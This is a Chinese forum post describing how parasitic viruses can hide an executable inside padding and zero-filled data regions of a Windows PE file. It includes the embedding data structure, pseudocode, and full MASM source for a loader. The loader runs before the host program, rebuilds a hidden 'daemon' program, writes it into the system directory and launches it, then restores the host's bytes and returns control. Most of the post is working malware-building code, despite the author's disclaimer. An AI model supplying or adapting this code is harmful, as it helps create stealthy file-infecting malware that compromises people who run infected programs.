
# [原创]有效利用PE文件内部空间植入用户程序

## 文章信息

- 【文章标题】: 有效利用PE文件内部空间植入用户程序
- 【文章作者】: 空手剑客
- 【编写语言】: C/C++ MASM
- 【使用工具】: VC++6.0 RadASM PEid
- 【操作平台】: winXP
- 【作者声明】: 请勿用于非法目的！

---

## 详细过程

寄生型（或者称为植入型）病毒程序将自身的可执行代码附加到宿主程序中，并修改宿主程序的入口地址。当操作系统执行宿主程序时，先执行的是病毒程序，随后才执行真正的宿主程序。

最简单的寄生型病毒程序在宿主程序的尾部增加一个节，包含了全部的可执行病毒程序，但这会明显增加宿主程序的文件大小，极易被发现。随着对PE文件格式的深入了解，大家发现每个节的尾部有大量的富余空间可以利用，可以植入相当长的可执行代码，这主要是PE文件的节对齐(`FileAlignment`)所致。在程序执行时每个节都将被载入内存，实际的代码大小由各个节的`VirtualSize`所决定，但是由于提出了节对齐要求，PE文件中每个节的大小将会自动调整到`FileAlignment`的整数倍，当然这样做会导致每个节的实际大小大于代码的大小（碰巧相等的情况相当少见），多余的文件大小在操作系统加载PE文件时是无用的，因而可以充分利用这一特点，将可执行代码写入节与节之间的空隙（即补齐部分）。许多新型的病毒都是利用这一特点寄生在PE文件中，但是这一空间大小仍然很有限，更大一些的病毒程序代码则无法寄生了。

本人通过仔细研究PE文件的内容，发现其内部仍有大量的空间可以用于代码植入。例如，程序内部定义变量是会产生大量的初始为0空间，尤其是定义数组时。以下面的数据定义为例，

```text
jumpaddr            dd          0
hDaemon             dd          0
now\_basein          dd          0
byte\_read           dd          0
cDaemonName         db          50 dup(0)
cSysdir             db          30 dup(0)
```

程序文件产生的连续为0空间为96bytes，如果充分利用这一空间，对于提高寄生代码的长度非常有意义。当然需要寻找的空间并不一定要连续为0，也可以连续为别的数据。

在执行宿主程序之前，寄生代码将潜伏在宿主中的可执行代码取出，生成完整的寄生程序，并恢复宿主原有的数据内容。实现这一设想的关键技术有以下几个：

1. 寻找宿主程序中的可用空间
2. 寄生代码在宿主程序中的数据结构
3. 寄生代码的重组
4. 宿主程序数据的恢复

关键1的解决方法很简单：在宿主程序中寻找数据连续相等的位置，以byte为单位计算。

关键2的解决方法要求信息完整，保证有效提取寄生程序，保证能够有效恢复原有数据。在这里采用如下的结构：

```text
struct Header
{
   BYTE  OriginData;
   DWORD DataLength;
   DWORD NextVirtualAddress;
}
```

共9 bytes。

有了关键2的解决方法，关键3和4的解决就相对容易多了：

```text
do NextVirtualAddress!=0
{
   Code = Code + NextVirtualAddress[0]~NextVirtualAddress[DataLength-1]
   NextVirtualAddress[0-8]~NextVirtualAddress[DataLength-1]=NextVirtualAddress[0]~NextVirtualAddress[-9]
}
```

具体的实现方法见源代码，里面还有许多具体的处理技巧。

具体的处理过程如下：

1. 编写 `Loader.asm`,生成可执行文件，用`PEid`将`Loader`的关键节提取出来 `loader.exe.section-3.dmp`
2. 编写 `daemon.cpp`,生成可执行文件`daemon.exe`并用`upx`压缩，这样做无非就是想尽量缩减exe文件大小
3. 将`daemon.exe`和`loader.exe.section-3.dmp`拷贝只一个文件 `copy /b daemon.exe + loader.exe.section-3.dmp ND.exe`
4. 运行`ND`文件即可。

### Loader.asm 源码

```asm
;********************************************************************
;*                                                            *
;*                        Loader.asm                          *
;*                                                            *
'********************************************************************

.386
.model flat,stdcall
  option casemap:none

  include windows.inc
  include kernel32.inc
  include comctl32.inc
  include user32.inc
  include gdi32.inc
  include comdlg32.inc
  include shell32.inc

  includelib gdi32.lib
  includelib kernel32.lib
  includelib comctl32.lib
  includelib user32.lib
  includelib comdlg32.lib
  includelib shell32.lib

.code

    invoke ExitProcess,0

;主程序代码，Loader执行完后会转入此处，最终无用。
 Loader SEGMENT PARA USE32 "Loader"
    assume cs:Loader ,ds:Loader
 vstart:
    push ebp
    push esp
    call nstart
 nstart:
;;;;;;;;;;;;;
    pop ebp
    sub ebp,offset nstart
;常用的一种方法。得到一个偏移差。
;程序后面用到的所有变量都需要加上个这偏移差
;------------------------------------(上面的)--
    mov now\_basein[ebp],401000h
;   正确的程序入口，需要根据实际情况修改
    mov edi,401000h
;   数据提取地址，需要根据实际情况修改
;------------------------------------(上面的)--
    push 50
    lea  eax, cSysdir[ebp]  ;Daemon
    push eax
    call vGetSystemDirectory
    mov eax, ebp
    add eax, ebx
    add eax, edi
    push eax
    lea  eax, cSysdir[ebp]  ;Daemon
    push eax
    lea  eax, cFmtstr[ebp]
    push eax
    lea  eax, cDaemonName[ebp]  ;Daemon
    push eax
    call vwsprintf
    add esp,10h ;保证堆栈平衡
    push 0
    push FILE\_ATTRIBUTE\_NORMAL
    push CREATE\_ALWAYS
    push 0
    push FILE\_SHARE\_READ+FILE\_SHARE\_WRITE
    push GENERIC\_READ+GENERIC\_WRITE
    lea eax, cDaemonName[ebp]  ;Daemon
    push eax
    call vCreateFile
    mov hDaemon[ebp],eax
;打开文件Daemon
;------------------------------------(上面的)--
; OriginData   DataLength   NextAddress
;   1 db        1 dd          1 dd
loop\_extract:
    mov esi, edi
    mov dh, byte ptr [esi]          ; dh - data to be restored
    mov ebx, dword ptr [esi+1]      ; ebx - DataLength
    mov edi, dword ptr [esi+5]      ; edi - NextAddress
    cmp ebx,0        ;DataLength=0,continue
    jle label\_1
    cmp hDaemon[ebp],INVALID\_HANDLE\_VALUE
    jz label\_1       ;跳过写Daemon，继续恢复数据
    push edx
    push 0
    lea  eax,byte\_read[ebp]
    push eax
    push ebx
    add  esi, 9
    push esi
    push hDaemon[ebp]
    call vWriteFile
;写数据
;---------------------------------------
    pop edx
    lea eax, vstart[ebp]
    cmp eax, esi
    jz  label\_1
;如果是Loader，不需要恢复原始数据
    add ebx,8
loop\_restore:
    mov byte ptr [esi-9+ebx], dh
    dec ebx
    jnz loop\_restore
;恢复原始数据
;---------------------------------------
label\_1:
    cmp  edi, 0
    je   finish\_read
; 下一段的入口地址NextAddress为0表示结束
;--------------------------------------------
    jmp  loop\_extract
finish\_read:
    push hDaemon[ebp]
    call vCloseHandle
    lea eax,cSysdir[ebp]
    push SW\_SHOW
    push eax
    push eax
    lea  eax,cDaemonName[ebp]
    push eax
    lea  eax,cOpCode[ebp]
    push eax
    push NULL
    call vShellExecute
;打开提取出来的文件
;------------------------------------(上面的)--
createfail:
;###########################################;
; 恢复寄存器，跳回原程序处
;------------------------------------------
     mov eax,now\_basein[ebp]
     pop esp
     pop ebp
     push eax
;-------< 做好返回原程序的准备 >-----------
    ret     ;返回主程序
;--------------------------
; 函数调用地址
;--------------------------
 vGetWindowsDirectory:
    mov jumpaddr[ebp],7C82293Bh
    jmp jumpaddr[ebp]
;00402004 >7C82293B  kernel32.GetWindowsDirectoryA
 vGetSystemDirectory:
    mov jumpaddr[ebp],7C814C63h
    jmp jumpaddr[ebp]
;00402004 >7C814C63  kernel32.GetSystemDirectoryA
 vGetCommandLine:
    mov jumpaddr[ebp],7C812C8Dh
    jmp jumpaddr[ebp]
;00402000 >7C812C8D  kernel32.GetCommandLineA
 vwsprintf:
    mov jumpaddr[ebp],77D1A2DEh
    jmp jumpaddr[ebp]
;00402010 >77D1A2DE  user32.wsprintfA
 vCreateFile:
    mov jumpaddr[ebp],7C801A24h
    jmp jumpaddr[ebp]
;00490628 >7C801A24  kernel32.CreateFileA
  vSetFilePointer:
    mov jumpaddr[ebp],7C810DA6h
    jmp jumpaddr[ebp]
 ;00490634 >7C810DA6  kernel32.SetFilePointer
  vReadFile:
    mov jumpaddr[ebp],7C80180Eh
    jmp jumpaddr[ebp]
;00490638 >7C80180E  kernel32.ReadFile
  vWriteFile:
    mov jumpaddr[ebp],7C810F9Fh
    jmp jumpaddr[ebp]
;0049061C >7C810F9F  kernel32.WriteFile
  vCloseHandle:
    mov jumpaddr[ebp],7C809B77h
    jmp jumpaddr[ebp]
;00490654 >7C809B77  kernel32.CloseHandle
  vMessageBox:
    mov jumpaddr[ebp],77D5050Bh
    jmp jumpaddr[ebp]
;00402008 >77D5050B  user32.MessageBoxA
 vGetSystemTime:
    mov jumpaddr[ebp],7C80176Bh
    jmp jumpaddr[ebp]
;00402000 >7C80176B  kernel32.GetSystemTime
  vExitProcess:
    mov jumpaddr[ebp],7C81CAA2h
    jmp jumpaddr[ebp]
;00490600 >7C81CAA2  kernel32.ExitProcess
  vShellExecute:
    mov jumpaddr[ebp],773EFE44h
    jmp jumpaddr[ebp]
;ds:[0040200C]=773EFE44 (shell32.ShellExecute)
;不同的WIN系统这里的地址是不同的。
;因此说并不是每个WIN系统都会传染的
;------------------------------------(上面的)--
    ALIGN 4
    jumpaddr            dd          0
    hDaemon             dd          0
    now\_basein          dd          0
```
